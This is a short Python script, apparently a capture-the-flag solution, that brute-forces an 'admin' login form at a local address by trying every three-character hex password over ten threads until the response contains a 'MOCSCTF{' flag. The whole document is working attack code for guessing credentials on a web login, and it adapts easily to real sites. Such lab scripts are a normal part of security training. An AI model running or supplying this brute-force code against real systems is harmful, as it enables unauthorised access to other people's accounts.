import requests
from concurrent.futures import ThreadPoolExecutor

url = "http://127.0.0.1:9999"
combinations = "1234567890abcdef"

password = []
for i in combinations:
    for j in combinations:
        for k in combinations:
            password.append(f"{i}{j}{k}")


def try_password(password_attempt):
    r = requests.post(url, data={"username": "admin", "password": password_attempt})
    if "MOCSCTF{" in r.text:
        return f"Found flag: {r.text}"
    else:
        return f"{password_attempt} is not right"


def start_threads():
    with ThreadPoolExecutor(max_workers=10) as executor:
        results = executor.map(try_password, password)

        for result in results:
            print(result)
            if "Found flag" in result:
                exit()


if __name__ == '__main__':
    start_threads()